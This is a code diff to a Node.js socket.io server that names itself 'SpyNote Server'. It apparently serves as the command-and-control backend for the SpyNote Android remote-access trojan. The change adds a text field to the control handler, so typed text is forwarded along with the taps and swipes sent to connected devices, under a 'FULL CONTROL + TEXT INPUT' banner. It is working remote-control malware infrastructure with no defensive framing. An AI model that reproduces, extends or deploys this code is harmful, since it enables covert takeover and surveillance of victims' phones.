@@ -68,13 +68,11 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 FIXED CONTROL HANDLER
+    // 🔥 TEXT INPUT + ALL CONTROLS HANDLER
     socket.on('control', (data) => {
-        console.log('🎮 RAW CONTROL RECEIVED:', JSON.stringify(data, null, 2));
+        console.log('🎮 CONTROL RECEIVED:', JSON.stringify(data));
         
-        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
-        console.log('🎮 PARSED -> Device:', deviceId, 'Action:', action);
-        console.log('🎮 COORDS -> x:', x, 'y:', y, 'startX:', startX, 'startY:', startY, 'endX:', endX, 'endY:', endY);
+        const { deviceId, action, x, y, startX, startY, endX, endY, text } = data;
         
         if (!devices.has(deviceId)) {
             console.log('❌ Device not found:', deviceId);
@@ -87,7 +85,7 @@ io.on('connection', (socket) => {
             return;
         }
 
-        // 🔥 CLEAN DATA FOR DEVICE
+        // 🔥 CLEAN DATA INCLUDING TEXT
         const cleanData = {
             action: action,
             x: Number(x) || 0,
@@ -95,16 +93,16 @@ io.on('connection', (socket) => {
             startX: Number(startX) || Number(x) || 0,
             startY: Number(startY) || Number(y) || 0,
             endX: Number(endX) || 0,
-            endY: Number(endY) || 0
+            endY: Number(endY) || 0,
+            text: text || ''  // 🔥 NEW TEXT FIELD
         };
 
-        console.log('✅ SENDING TO DEVICE:', JSON.stringify(cleanData, null, 2));
+        console.log('✅ FORWARDING TO DEVICE:', JSON.stringify(cleanData));
 
-        // Send to specific socket AND room
         io.to(targetSocketId).emit('control', cleanData);
         io.to(deviceId).emit('control', cleanData);
         
-        console.log('✅ Control sent to:', deviceId, 'Socket:', targetSocketId);
+        console.log('✅ Control/Text sent to:', deviceId);
     });
 
     socket.on('disconnect', () => {
@@ -124,5 +122,5 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
-    console.log(`📱 Multi-device + FULL CONTROL ready!`);
+    console.log(`📱 Multi-device + FULL CONTROL + TEXT INPUT ready!`);
 });
